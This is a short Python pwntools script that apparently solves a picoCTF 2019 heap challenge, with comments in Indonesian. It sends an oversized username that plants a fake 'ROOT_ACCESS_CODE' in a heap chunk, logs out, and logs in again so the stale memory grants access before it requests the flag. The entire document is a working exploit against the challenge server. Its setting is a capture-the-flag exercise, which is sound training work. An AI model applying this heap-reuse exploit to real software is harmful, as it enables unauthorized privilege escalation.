from pwn import *

#p = process("./auth")
p = remote("2019shell1.picoctf.com", 49920)

def login(size, payload):
    p.sendlineafter("> ", "login")
    p.sendlineafter("username\n", str(size)) 
    p.sendlineafter("username\n", payload)

def exploit():
    payload = ""
    payload += "A" * 8 # isi username
    payload += "ROOT_ACCESS_CODE" # overwrite accescode, heap dimulai dari addres variable u di fungsi login

    login(32, payload) # size(malloc) 32, bebas berapapun secukupnya agar dapat mengoverwrite mengisi heap chunk dari access code
    p.sendlineafter("> ", "logout")
    login(16, "Gladys") # size bebas karena hanya akan mengisi sebuah address
    p.sendlineafter("> ", "print-flag")
    p.interactive()


if __name__ == "__main__":
    exploit()
